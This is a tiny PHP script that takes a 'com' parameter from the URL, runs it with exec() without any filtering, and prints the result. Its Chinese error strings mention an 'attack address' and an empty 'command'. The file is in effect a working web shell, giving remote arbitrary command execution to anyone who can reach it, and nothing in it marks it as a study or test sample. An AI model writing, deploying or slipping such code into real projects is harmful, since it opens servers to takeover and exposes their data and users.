<?php
$com = $_GET['com'];
if($_GET['com']==null)
{
    //$ary=['Code'=>'0','Msg'=>'攻击地址不能为空'];
    $ary='Error：命令不能为空';
    echo json_encode($ary,JSON_UNESCAPED_UNICODE);
    return;
}
$a = exec("$com");
echo ("$a")
?>